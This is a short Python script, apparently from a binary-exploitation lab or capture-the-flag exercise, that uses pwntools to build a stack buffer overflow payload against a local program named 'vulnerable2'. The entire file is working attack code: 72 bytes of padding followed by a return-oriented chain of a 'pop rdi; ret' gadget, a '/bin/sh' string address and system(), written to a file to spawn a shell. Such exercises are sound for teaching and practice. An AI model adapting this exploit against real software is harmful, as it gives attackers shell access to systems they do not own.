# exploit.py
from pwn import *

# Set up the binary
elf = ELF('./vulnerable2')

# Find the address of system() in the PLT
system_addr = elf.plt['system']

# Find a '/bin/sh' string in the binary, or the libc
# In a real exploit, you might need to find this in libc
binsh = next(elf.search(b'/bin/sh'))

# Calculate our buffer overflow padding
# 64 bytes for buffer + 8 bytes for saved base pointer
padding = b'A' * 72

# Create our ROP chain
payload = b''
payload += padding                    # Fill buffer and overwrite base pointer
payload += p64(0x4005d3)             # Address of "pop rdi; ret" gadget
payload += p64(binsh)                # Address of "/bin/sh" string
payload += p64(system_addr)          # Address of system()

# Write our payload to a file
with open('payload', 'wb') as f:
    f.write(payload)

print("Payload written to 'payload' file")
